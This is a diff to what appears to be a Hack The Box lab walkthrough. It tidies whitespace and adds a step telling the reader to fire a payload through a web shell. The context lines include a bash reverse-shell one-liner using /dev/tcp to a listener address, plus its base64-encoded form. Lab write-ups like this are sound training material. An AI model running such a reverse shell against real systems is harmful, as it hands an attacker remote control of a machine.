@@ -1061,10 +1061,10 @@ The listener is up and waiting. Leave this terminal open and move to Terminal 2.
 ```shell
 ┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
 └─$ echo 'bash -i >& /dev/tcp/10.10.15.227/80 0>&1' | base64 -w0
-YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=                                                                            
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=
 ```
 
-
+This is the base64-encoded reverse shell payload. Now trigger it through the web shell — make sure your listener in Terminal 1 is still running before sending this:
 <div align="center">
 <br>
 <br>
